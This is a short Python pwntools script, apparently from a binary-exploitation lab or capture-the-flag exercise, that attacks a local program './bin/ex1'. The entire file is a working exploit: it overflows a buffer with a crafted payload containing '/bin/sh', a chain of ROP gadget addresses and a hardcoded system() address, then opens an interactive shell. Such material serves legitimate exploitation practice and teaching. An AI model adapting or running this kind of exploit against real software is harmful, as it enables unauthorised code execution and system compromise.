#!/usr/bin/env python3

from pwn import *
target = process("./bin/ex1")

line = target.recvline().decode().strip()
print(f"Received line: {line}")

input_index = 0
target.sendline(str(input_index).encode()) # Index 0, the call of is_booked will put the address of airlines[input_index] into RDI and we will use that for the call to system

# consume menu lines
for _ in range(6):
    print(target.recvline().decode().strip())

system_address = 0x7ffff7c4b980
puts_address = 0x7ffff7c783d0
rop_address = 0x40101a

payload = (b"K" * 63 + b"\x00") + (b"/bin/sh\x00" +  b"K" * 56)  + b"F" * 3 * 64 + b"F" * 24 + 14 * p64(rop_address, "little") + p64(system_address, "little")
target.sendline(payload)
target.interactive()
